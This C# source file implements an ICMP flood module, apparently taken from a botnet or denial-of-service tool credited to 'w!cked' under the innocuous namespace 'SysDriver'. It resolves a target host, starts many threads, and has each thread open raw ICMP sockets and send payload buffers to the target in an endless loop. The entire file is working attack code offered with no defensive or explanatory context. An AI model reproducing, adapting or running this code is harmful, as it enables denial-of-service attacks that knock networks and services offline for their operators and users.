using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace SysDriver
{
    /* Copyright © 2010 w!cked */

    internal class nICMPFlood
    {
        private static ThreadStart[] tFloodingJob;
        private static Thread[] tFloodingThread;
        public static string sFHost;
        public static int iICMPSockets;
        private static IPEndPoint IPEo;
        public static int iPSize;
        private static ICMPRequest[] ICMPClass;
        public static int iThreads;

        public static void StartICMPFlood()
        {
            try
            {
                IPEo = new IPEndPoint(Dns.GetHostEntry(sFHost).AddressList[0], 0);
            }
            catch
            {
                IPEo = new IPEndPoint(IPAddress.Parse(sFHost), 0);
            }

            tFloodingThread = new Thread[iThreads];
            tFloodingJob = new ThreadStart[iThreads];
            ICMPClass = new ICMPRequest[iThreads];

            for (int i = 0; i < iThreads; i++)
            {
                ICMPClass[i] = new ICMPRequest(IPEo, iICMPSockets, iPSize);
                tFloodingJob[i] = new ThreadStart(ICMPClass[i].Send);
                tFloodingThread[i] = new Thread(tFloodingJob[i]);
                tFloodingThread[i].Start();
            }
        }

        public static void StopICMPFlood()
        {
            for (int i = 0; i < iThreads; i++)
            {
                try
                {
                    tFloodingThread[i].Abort();
                    tFloodingThread[i].Join();
                }
                catch { }
            }
        }

        private class ICMPRequest
        {
            private int iICMPSockets;
            private IPEndPoint IPEo;
            private int iPSize;
            private Socket[] pSocket;

            public ICMPRequest(IPEndPoint tIPEo, int tICMPSockets, int tPSize)
            {
                this.IPEo = tIPEo;
                this.iICMPSockets = tICMPSockets;
                this.iPSize = tPSize;
            }

            public void Send()
            {
                int iNum;
                byte[] rBuffer = new byte[this.iPSize];
            Label:
                try
                {
                    this.pSocket = new Socket[this.iICMPSockets];

                    for (iNum = 0; iNum < this.iICMPSockets; iNum++)
                    {
                        this.pSocket[iNum] = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp);
                        this.pSocket[iNum].Blocking = false;
                        this.pSocket[iNum].SendTo(rBuffer, this.IPEo);
                    }

                    Thread.Sleep(100);

                    for (iNum = 0; iNum < this.iICMPSockets; iNum++)
                    {
                        if (this.pSocket[iNum].Connected) { this.pSocket[iNum].Disconnect(false); }
                        this.pSocket[iNum].Close();
                        this.pSocket[iNum] = null;
                    }

                    this.pSocket = null;
                    goto Label;
                }
                catch
                {
                    for (iNum = 0; iNum < this.iICMPSockets; iNum++)
                    {
                        try
                        {
                            if (this.pSocket[iNum].Connected) { this.pSocket[iNum].Disconnect(false); }
                            this.pSocket[iNum].Close();
                            this.pSocket[iNum] = null;
                        }
                        catch { }
                    }

                    goto Label;
                }
            }
        }
    }
}

